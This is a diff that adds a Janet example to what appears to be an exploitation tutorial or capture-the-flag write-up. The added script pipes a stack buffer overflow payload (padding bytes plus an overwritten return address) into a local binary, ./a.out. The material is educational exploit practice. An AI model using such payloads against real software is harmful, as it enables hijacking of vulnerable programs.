@@ -295,3 +295,14 @@ func main() {
 	panicIf(err)
 }
 ```
+
+Or perhaps something more Lispy?
+
+### Janet
+
+```janet
+#!/usr/bin/env janet
+(use sh)
+(def input "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xc0\x11\x40\x00\x00\x00\x00\x00")
+($ ./a.out < ,input)
+```
